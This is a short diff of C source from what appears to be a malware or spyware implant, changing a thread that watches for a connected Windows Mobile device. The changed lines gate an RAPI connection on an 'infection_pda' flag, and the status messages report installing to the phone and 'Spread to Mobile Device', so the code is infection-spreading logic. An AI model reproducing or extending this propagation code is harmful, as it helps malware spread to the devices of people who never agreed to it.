@@ -1168,7 +1168,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 #else
 	static BOOL first_time = TRUE;
 	LOOP {
-		if (first_time && TryRapiConnect(3000)) {
+		if (first_time && infection_pda && RapiInit() && TryRapiConnect(3000)) {
 			first_time = FALSE;
 			REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
 			SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
